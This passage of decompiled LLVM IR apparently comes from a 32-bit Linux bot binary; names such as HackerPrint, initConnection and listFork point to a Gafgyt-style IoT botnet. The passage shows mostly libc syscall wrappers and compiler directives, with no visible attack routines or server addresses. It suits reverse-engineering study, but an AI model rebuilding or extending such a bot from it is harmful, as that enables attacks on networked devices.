  store i32 %v0_80513d1, i32* %v3_80513d1, align 4
  %v0_80513d2 = call i32 @recvLine()
  store i32 %v0_80513d2, i32* %eax.global-to-local, align 4
  %v0_80513d7 = load i32, i32* @esp, align 4
  %v8_80513dd = icmp ne i32 %v0_80513d2, -1
  store i1 %v8_80513dd, i1* %cf.global-to-local, align 1
  %v13_80513dd = icmp eq i32 %v0_80513d2, -1
  %v1_80513e1 = icmp eq i1 %v13_80513dd, false
  br i1 %v1_80513e1, label %dec_label_pc_8050f64, label %dec_label_pc_8050d4e.outer

; uselistorder directives
  uselistorder i32 %v0_80513d2, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-60.3, { 1, 0 }
  uselistorder i32 %v0_80513c8, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-64.2.ph29, { 1, 0 }
  uselistorder i32 %stack_var_-28.1.ph, { 0, 2, 1 }
  uselistorder i32 %v4_80513b1, { 0, 3, 1, 2, 4 }
  uselistorder i32 %storemerge188, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8051376, { 2, 1, 0 }
  uselistorder i32 %v3_8051361, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 0, 2, 1 }
  uselistorder i32 %v0_8051357, { 2, 1, 0 }
  uselistorder i32 %v1_8051327, { 1, 0 }
  uselistorder i32 %v1_80512f8, { 1, 0 }
  uselistorder i32 %v5_80512d4, { 1, 0 }
  uselistorder i32 %v4_80512d1, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.153, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_80512dd, { 2, 0, 1 }
  uselistorder i32 %v1_80512c0, { 1, 0 }
  uselistorder i32 %v0_8051289, { 0, 2, 1 }
  uselistorder i32 %storemerge25.in.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8051246, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805122a, { 0, 1, 4, 5, 2, 3, 6 }
  uselistorder i32 %v0_8051217, { 1, 2, 0 }
  uselistorder i32 %v0_80511fc, { 1, 2, 3, 0 }
  uselistorder i1 %v0_80511bf, { 1, 0 }
  uselistorder i32 %v7_80511bd, { 1, 0 }
  uselistorder i8* %v22_8051159, { 0, 2, 1 }
  uselistorder i8* %storemerge16, { 1, 0 }
  uselistorder i32 %v5_8051181, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8051172, { 1, 0 }
  uselistorder i32 %storemerge16.in182, { 2, 1, 0 }
  uselistorder i8* %storemerge16183, { 1, 0 }
  uselistorder i32 %v6_805112c, { 1, 0 }
  uselistorder i32 %v6_8051104, { 1, 0 }
  uselistorder i32 %v6_80510df, { 1, 0 }
  uselistorder i32 %v1_80510f4, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_80510bc, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_80510b9, { 9, 8, 13, 6, 7, 11, 10, 0, 4, 1, 2, 3, 12, 14, 5, 15, 16, 17 }
  uselistorder i32 %v6_80510b6, { 1, 0 }
  uselistorder i8* %storemerge17.lcssa, { 1, 0 }
  uselistorder i32 %v5_8051069, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v3_805102c, { 0, 2, 1 }
  uselistorder i32 %v0_8050ff3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_8050fee, { 0, 2, 1 }
  uselistorder i32 %v0_8050fdc, { 1, 2, 0 }
  uselistorder i32 %v0_8050f7e, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %v0_8050f78, { 1, 0, 2 }
  uselistorder i32 %storemerge18, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.2, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8050dcd.in, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8050f06, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 1, 3, 0, 2 }
  uselistorder i32 %v2_8050ed3, { 2, 0, 1 }
  uselistorder i32 %v1_8050ebc, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8050e87, { 1, 0 }
  uselistorder i32 %v0_8050e2c, { 1, 0, 2 }
  uselistorder i32 %storemerge20, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_8050dfb, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8050dbe, { 1, 0 }
  uselistorder i8* %storemerge17146, { 2, 0, 1, 3 }
  uselistorder i32 %v5_8051056, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_80511e3, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v2_80513bc, { 15, 16, 0, 1, 6, 5, 7, 8, 2, 10, 9, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 %v1_8050cde, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8050cac, { 1, 0, 2 }
  uselistorder i32 %v2_8050c70, { 1, 0, 2 }
  uselistorder i32 %v2_8050b92, { 0, 1, 2, 4, 3 }
  uselistorder i8** %stack_var_-5376, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 2 }
  uselistorder i32* %stack_var_-5392, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i8** %stack_var_-36, { 4, 2, 1, 3, 0 }
  uselistorder i32* %edx.global-to-local, { 13, 14, 0, 1, 2, 3, 4, 5, 12, 7, 6, 8, 10, 9, 11, 15, 16, 17, 18 }
  uselistorder i32* %eax.global-to-local, { 80, 81, 2, 0, 1, 116, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 15, 16, 17, 18, 21, 22, 23, 24, 25, 35, 26, 28, 31, 32, 29, 30, 122, 121, 33, 34, 36, 37, 120, 119, 38, 39, 40, 43, 44, 45, 41, 42, 46, 47, 48, 49, 50, 51, 52, 53, 118, 117, 54, 55, 56, 57, 59, 60, 58, 61, 62, 63, 79, 64, 65, 68, 66, 67, 69, 70, 73, 71, 72, 74, 75, 76, 77, 78, 82, 83, 84, 86, 85, 27, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115 }
  uselistorder i1* %cf.global-to-local, { 58, 59, 1, 0, 93, 2, 3, 10, 4, 5, 6, 7, 8, 9, 25, 11, 12, 13, 17, 18, 14, 15, 16, 19, 20, 21, 22, 23, 96, 28, 26, 27, 97, 29, 30, 95, 31, 32, 34, 35, 33, 36, 37, 38, 39, 94, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 57, 51, 52, 53, 54, 55, 56, 60, 61, 62, 65, 63, 64, 24, 66, 67, 68, 69, 70, 71, 92, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 6, 5, 4, 3, 2, 1, 0, 13, 12, 11, 10, 9, 8, 7 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @szprintf, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 5, 4, 3, 2, 1, 0, 12, 11, 10, 9, 8, 7, 6 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_8058597.21 to i32), { 2, 1, 0 }
  uselistorder i32 ()* @trim, { 1, 0 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 17, 16, 0 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 2, 3, 4, 5, 6, 7, 8, 28, 29 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 11, 2, 3, 4, 5, 0, 1, 6, 7, 8, 10, 9 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8063708.232, { 4, 0, 3, 2, 1 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 6, 1, 7, 8, 9, 0, 2, 3, 10, 11, 12, 4, 5 }
  uselistorder label %dec_label_pc_80513bc.outer28, { 1, 0 }
  uselistorder label %dec_label_pc_805139e, { 1, 0 }
  uselistorder label %dec_label_pc_8051357, { 1, 0 }
  uselistorder label %dec_label_pc_80512d1, { 1, 0 }
  uselistorder label %dec_label_pc_80512a8, { 1, 0 }
  uselistorder label %dec_label_pc_8051272, { 1, 0 }
  uselistorder label %dec_label_pc_8051164, { 1, 0 }
  uselistorder label %dec_label_pc_8051153, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805114a, { 1, 0 }
  uselistorder label %dec_label_pc_80510e6, { 1, 0 }
  uselistorder label %dec_label_pc_805107e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051075, { 1, 0 }
  uselistorder label %dec_label_pc_80513bc.outer28.backedge, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_805104a, { 1, 0 }
  uselistorder label %dec_label_pc_8050f61, { 1, 0 }
  uselistorder label %dec_label_pc_8050ef2, { 1, 0 }
  uselistorder label %dec_label_pc_8050ed0, { 1, 0 }
  uselistorder label %dec_label_pc_8050e18, { 1, 0 }
  uselistorder label %dec_label_pc_8050dee, { 1, 0 }
  uselistorder label %dec_label_pc_8050d57, { 1, 0 }
  uselistorder label %dec_label_pc_8050d28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050bf0, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80513f2 = call i32 @vfork()
  %v5_80513f5 = icmp ult i32 %v0_80513f2, -4095
  %v1_80513fa = icmp eq i1 %v5_80513f5, false
  call void @__pseudo_cond_branch(i1 %v1_80513fa, i32 134565252)
  ret i32 %v0_80513f2
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8051404 = load i32, i32* @edi, align 4
  %v0_8051405 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8051419 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_8051423 = icmp ugt i32 %v1_8051419, 2
  br i1 %v6_8051423, label %dec_label_pc_8051433, label %dec_label_pc_8051425

dec_label_pc_8051425:                             ; preds = %entry
  %v4_8051429 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8051419)
  br label %dec_label_pc_8051455

dec_label_pc_8051433:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805143b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_805143b, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_805143b, -4095
  br i1 %tmp17, label %dec_label_pc_8051453, label %dec_label_pc_8051447

dec_label_pc_8051447:                             ; preds = %dec_label_pc_8051433
  %v1_8051447 = call i32 @__errno_location(i32 %v0_8051405)
  %v0_805144c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805144c = sub i32 0, %v0_805144c
  %v2_805144e = inttoptr i32 %v1_8051447 to i32*
  store i32 %v1_805144c, i32* %v2_805144e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051453

dec_label_pc_8051453:                             ; preds = %dec_label_pc_8051433, %dec_label_pc_8051447
  %v0_8051453 = phi i32 [ %v2_805143b, %dec_label_pc_8051433 ], [ -1, %dec_label_pc_8051447 ]
  br label %dec_label_pc_8051455

dec_label_pc_8051455:                             ; preds = %dec_label_pc_8051425, %dec_label_pc_8051453
  %v0_805145a = phi i32 [ %v4_8051429, %dec_label_pc_8051425 ], [ %v0_8051453, %dec_label_pc_8051453 ]
  store i32 %v0_8051405, i32* @ebx, align 4
  store i32 %v0_8051404, i32* @edi, align 4
  ret i32 %v0_805145a

; uselistorder directives
  uselistorder i32 %v2_805143b, { 1, 0, 2 }
  uselistorder i32 %v0_8051405, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051455, { 1, 0 }
  uselistorder label %dec_label_pc_8051453, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805145c = load i32, i32* @edi, align 4
  store i32 %v0_805145c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8051474 = load i32, i32* @ebx, align 4
  %v1_805147c = call i32 @int80_syscall(i32 221)
  store i32 %v1_805147c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_805147c, -4095
  br i1 %tmp11, label %dec_label_pc_8051494, label %dec_label_pc_8051488

dec_label_pc_8051488:                             ; preds = %entry
  %v1_8051488 = call i32 @__errno_location(i32 %v0_8051474)
  %v0_805148d = load i32, i32* %edi.global-to-local, align 4
  %v1_805148d = sub i32 0, %v0_805148d
  %v2_805148f = inttoptr i32 %v1_8051488 to i32*
  store i32 %v1_805148d, i32* %v2_805148f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051494

dec_label_pc_8051494:                             ; preds = %entry, %dec_label_pc_8051488
  %v0_8051494 = phi i32 [ %v1_805147c, %entry ], [ -1, %dec_label_pc_8051488 ]
  %v2_8051499 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051499, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051494

; uselistorder directives
  uselistorder i32 %v1_805147c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051494, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80514c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80514c4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80514d7 = call i32 @access(i32 %v0_80514c4, i32 %tmp4)
  store i32 %v2_80514d7, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_80514d7, -4095
  br i1 %tmp8, label %dec_label_pc_80514f0, label %dec_label_pc_80514e4

dec_label_pc_80514e4:                             ; preds = %entry
  %v0_80514e4 = load i32, i32* %stack_var_-4, align 4
  %v1_80514e4 = call i32 @__errno_location(i32 %v0_80514e4)
  %v0_80514e9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514e9 = sub i32 0, %v0_80514e9
  %v2_80514eb = inttoptr i32 %v1_80514e4 to i32*
  store i32 %v1_80514e9, i32* %v2_80514eb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80514f0

dec_label_pc_80514f0:                             ; preds = %entry, %dec_label_pc_80514e4
  %v0_80514f0 = phi i32 [ %v2_80514d7, %entry ], [ -1, %dec_label_pc_80514e4 ]
  %v2_80514f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80514f4, i32* @ebx, align 4
  ret i32 %v0_80514f0

; uselistorder directives
  uselistorder i32 %v2_80514d7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @access, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80514f0, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80514f8 = load i32, i32* @edi, align 4
  store i32 %v0_80514f8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8051500 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051508 = call i32 @chdir(i32 %v0_8051500)
  store i32 %v0_8051500, i32* @ebx, align 4
  store i32 %v1_8051508, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8051508, -4095
  br i1 %tmp8, label %dec_label_pc_8051520, label %dec_label_pc_8051514

dec_label_pc_8051514:                             ; preds = %entry
  %v1_8051514 = call i32 @__errno_location(i32 %v0_8051500)
  %v0_8051519 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051519 = sub i32 0, %v0_8051519
  %v2_805151b = inttoptr i32 %v1_8051514 to i32*
  store i32 %v1_8051519, i32* %v2_805151b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051520

dec_label_pc_8051520:                             ; preds = %entry, %dec_label_pc_8051514
  %v0_8051520 = phi i32 [ %v1_8051508, %entry ], [ -1, %dec_label_pc_8051514 ]
  %v2_8051522 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051522, i32* @edx, align 4
  %v2_8051524 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051524, i32* @edi, align 4
  ret i32 %v0_8051520

; uselistorder directives
  uselistorder i32 %v1_8051508, { 1, 0, 2 }
  uselistorder i32 %v0_8051500, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051520, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051528 = load i32, i32* @edi, align 4
  store i32 %v0_8051528, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051530 = load i32, i32* @ebx, align 4
  %v1_8051538 = call i32 @close(i32 %arg1)
  store i32 %v0_8051530, i32* @ebx, align 4
  store i32 %v1_8051538, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8051538, -4095
  br i1 %tmp8, label %dec_label_pc_8051550, label %dec_label_pc_8051544

dec_label_pc_8051544:                             ; preds = %entry
  %v1_8051544 = call i32 @__errno_location(i32 %v0_8051530)
  %v0_8051549 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051549 = sub i32 0, %v0_8051549
  %v2_805154b = inttoptr i32 %v1_8051544 to i32*
  store i32 %v1_8051549, i32* %v2_805154b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051550

dec_label_pc_8051550:                             ; preds = %entry, %dec_label_pc_8051544
  %v0_8051550 = phi i32 [ %v1_8051538, %entry ], [ -1, %dec_label_pc_8051544 ]
  %v2_8051554 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051554, i32* @edi, align 4
  ret i32 %v0_8051550

; uselistorder directives
  uselistorder i32 %v1_8051538, { 1, 0, 2 }
  uselistorder i32 %v0_8051530, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051550, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051558 = load i32, i32* @ebx, align 4
  store i32 %v0_8051558, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805156b = call i32 @dup2(i32 %v0_8051558, i32 %tmp4)
  store i32 %v2_805156b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_805156b, -4095
  br i1 %tmp8, label %dec_label_pc_8051584, label %dec_label_pc_8051578

dec_label_pc_8051578:                             ; preds = %entry
  %v0_8051578 = load i32, i32* %stack_var_-4, align 4
  %v1_8051578 = call i32 @__errno_location(i32 %v0_8051578)
  %v0_805157d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805157d = sub i32 0, %v0_805157d
  %v2_805157f = inttoptr i32 %v1_8051578 to i32*
  store i32 %v1_805157d, i32* %v2_805157f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051584

dec_label_pc_8051584:                             ; preds = %entry, %dec_label_pc_8051578
  %v0_8051584 = phi i32 [ %v2_805156b, %entry ], [ -1, %dec_label_pc_8051578 ]
  %v2_8051588 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051588, i32* @ebx, align 4
  ret i32 %v0_8051584

; uselistorder directives
  uselistorder i32 %v2_805156b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051584, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805158c = load i32, i32* @ebx, align 4
  store i32 %v0_805158c, i32* %stack_var_-4, align 4
  %v1_8051595 = call i32 @fork(i32 %v0_805158c)
  store i32 %v1_8051595, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051595, -4095
  br i1 %tmp6, label %dec_label_pc_80515ac, label %dec_label_pc_80515a0

dec_label_pc_80515a0:                             ; preds = %entry
  %v0_80515a0 = load i32, i32* %stack_var_-4, align 4
  %v1_80515a0 = call i32 @__errno_location(i32 %v0_80515a0)
  %v0_80515a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80515a5 = sub i32 0, %v0_80515a5
  %v2_80515a7 = inttoptr i32 %v1_80515a0 to i32*
  store i32 %v1_80515a5, i32* %v2_80515a7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515ac

dec_label_pc_80515ac:                             ; preds = %entry, %dec_label_pc_80515a0
  %v0_80515ac = phi i32 [ %v1_8051595, %entry ], [ -1, %dec_label_pc_80515a0 ]
  %v2_80515ae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80515ae, i32* @edx, align 4
  %v2_80515b0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80515b0, i32* @ebx, align 4
  ret i32 %v0_80515ac

; uselistorder directives
  uselistorder i32 %v1_8051595, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80515ac, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80515b7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80515be = call i32 @getrlimit(i32 7, i32 %v2_80515b7)
  store i32 256, i32* @edx, align 4
  %v2_80515cb = icmp slt i32 %v2_80515be, 0
  br i1 %v2_80515cb, label %dec_label_pc_80515d3, label %dec_label_pc_80515cf

dec_label_pc_80515cf:                             ; preds = %entry
  %v3_80515cf = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80515cf, i32* @edx, align 4
  br label %dec_label_pc_80515d3

dec_label_pc_80515d3:                             ; preds = %entry, %dec_label_pc_80515cf
  %v0_80515d3 = phi i32 [ 256, %entry ], [ %v3_80515cf, %dec_label_pc_80515cf ]
  ret i32 %v0_80515d3

; uselistorder directives
  uselistorder label %dec_label_pc_80515d3, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80515dc = load i32, i32* @ebx, align 4
  store i32 %v0_80515dc, i32* %stack_var_-4, align 4
  %v1_80515e5 = call i32 @int80_syscall(i32 201)
  store i32 %v1_80515e5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80515e5, -4095
  br i1 %tmp6, label %dec_label_pc_80515fc, label %dec_label_pc_80515f0

dec_label_pc_80515f0:                             ; preds = %entry
  %v0_80515f0 = load i32, i32* %stack_var_-4, align 4
  %v1_80515f0 = call i32 @__errno_location(i32 %v0_80515f0)
  %v0_80515f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80515f5 = sub i32 0, %v0_80515f5
  %v2_80515f7 = inttoptr i32 %v1_80515f0 to i32*
  store i32 %v1_80515f5, i32* %v2_80515f7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515fc

dec_label_pc_80515fc:                             ; preds = %entry, %dec_label_pc_80515f0
  %v0_80515fc = phi i32 [ %v1_80515e5, %entry ], [ -1, %dec_label_pc_80515f0 ]
  %v2_8051600 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051600, i32* @ebx, align 4
  ret i32 %v0_80515fc

; uselistorder directives
  uselistorder i32 %v1_80515e5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_80515fc, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051604 = load i32, i32* @ebx, align 4
  store i32 %v0_8051604, i32* %stack_var_-4, align 4
  %v1_805160d = call i32 @getpid(i32 %v0_8051604)
  store i32 %v1_805160d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_805160d, -4095
  br i1 %tmp6, label %dec_label_pc_8051624, label %dec_label_pc_8051618

dec_label_pc_8051618:                             ; preds = %entry
  %v0_8051618 = load i32, i32* %stack_var_-4, align 4
  %v1_8051618 = call i32 @__errno_location(i32 %v0_8051618)
  %v0_805161d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805161d = sub i32 0, %v0_805161d
  %v2_805161f = inttoptr i32 %v1_8051618 to i32*
  store i32 %v1_805161d, i32* %v2_805161f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051624

dec_label_pc_8051624:                             ; preds = %entry, %dec_label_pc_8051618
  %v0_8051624 = phi i32 [ %v1_805160d, %entry ], [ -1, %dec_label_pc_8051618 ]
  %v2_8051628 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051628, i32* @ebx, align 4
  ret i32 %v0_8051624

; uselistorder directives
  uselistorder i32 %v1_805160d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051624, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805162c = load i32, i32* @ebx, align 4
  store i32 %v0_805162c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805163f = call i32 @int80_syscall(i32 191)
  store i32 %v1_805163f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_805163f, -4095
  br i1 %tmp8, label %dec_label_pc_8051658, label %dec_label_pc_805164c

dec_label_pc_805164c:                             ; preds = %entry
  %v0_805164c = load i32, i32* %stack_var_-4, align 4
  %v1_805164c = call i32 @__errno_location(i32 %v0_805164c)
